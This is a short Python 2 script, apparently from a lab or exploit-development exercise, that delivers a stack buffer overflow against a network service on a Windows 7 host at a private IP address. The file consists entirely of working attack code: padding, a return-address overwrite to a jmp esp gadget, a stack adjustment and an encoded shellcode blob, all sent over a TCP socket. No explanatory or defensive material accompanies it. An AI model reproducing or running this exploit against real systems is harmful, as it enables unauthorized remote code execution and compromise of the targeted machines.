#!/usr/bin/python
import socket
import struct

#set up ip and port
ServiceManagerIP = "10.185.10.55"
ServiceManagerPort = 42424

buf_totlen = 400
offset_srp = 146

ptr_jmp_esp = 0x080414c3

sub_esp_10 = "\x83\xec\x10"

shellcode =  ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xf0\x37\xa4\x3a\x83\xee\xfc\xe2\xf4\x0c\xdf\x26\x3a\xf0\x37"
"\xc4\xb3\x15\x06\x64\x5e\x7b\x67\x94\xb1\xa2\x3b\x2f\x68\xe4"
"\xbc\xd6\x12\xff\x80\xee\x1c\xc1\xc8\x08\x06\x91\x4b\xa6\x16"
"\xd0\xf6\x6b\x37\xf1\xf0\x46\xc8\xa2\x60\x2f\x68\xe0\xbc\xee"
"\x06\x7b\x7b\xb5\x42\x13\x7f\xa5\xeb\xa1\xbc\xfd\x1a\xf1\xe4"
"\x2f\x73\xe8\xd4\x9e\x73\x7b\x03\x2f\x3b\x26\x06\x5b\x96\x31"
"\xf8\xa9\x3b\x37\x0f\x44\x4f\x06\x34\xd9\xc2\xcb\x4a\x80\x4f"
"\x14\x6f\x2f\x62\xd4\x36\x77\x5c\x7b\x3b\xef\xb1\xa8\x2b\xa5"
"\xe9\x7b\x33\x2f\x3b\x20\xbe\xe0\x1e\xd4\x6c\xff\x5b\xa9\x6d"
"\xf5\xc5\x10\x68\xfb\x60\x7b\x25\x4f\xb7\xad\x5f\x97\x08\xf0"
"\x37\xcc\x4d\x83\x05\xfb\x6e\x98\x7b\xd3\x1c\xf7\xc8\x71\x82"
"\x60\x36\xa4\x3a\xd9\xf3\xf0\x6a\x98\x1e\x24\x51\xf0\xc8\x71"
"\x6a\xa0\x67\xf4\x7a\xa0\x77\xf4\x52\x1a\x38\x7b\xda\x0f\xe2"
"\x33\x50\xf5\x5f\xae\x83\xfa\x15\xcc\x38\xf0\x22\x17\xb3\x16"
"\x5d\xb4\x6c\xa7\x5f\x3d\x9f\x84\x56\x5b\xef\x75\xf7\xd0\x36"
"\x0f\x79\xac\x4f\x1c\x5f\x54\x8f\x52\x61\x5b\xef\x98\x54\xc9"
"\x5e\xf0\xbe\x47\x6d\xa7\x60\x95\xcc\x9a\x25\xfd\x6c\x12\xca"
"\xc2\xfd\xb4\x13\x98\x3b\xf1\xba\xe0\x1e\xe0\xf1\xa4\x7e\xa4"
"\x67\xf2\x6c\xa6\x71\xf2\x74\xa6\x61\xf7\x6c\x98\x4e\x68\x05"
"\x76\xc8\x71\xb3\x10\x79\xf2\x7c\x0f\x07\xcc\x32\x77\x2a\xc4"
"\xc5\x25\x8c\x44\x27\xda\x3d\xcc\x9c\x65\x8a\x39\xc5\x25\x0b"
"\xa2\x46\xfa\xb7\x5f\xda\x85\x32\x1f\x7d\xe3\x45\xcb\x50\xf0"
"\x64\x5b\xef")



# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "BBBB"
buf += sub_esp_10
buf += shellcode
buf += "D"*(buf_totlen - len(buf))


#Attempt to send message
try:
    print "Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Connect to Win7 machine
    connect = s.connect((ServiceManagerIP, ServiceManagerPort))
    s.send(buf + '\r\n')
    s.recv(1024)
    s.close()
    
except:
    print "Could not connect"
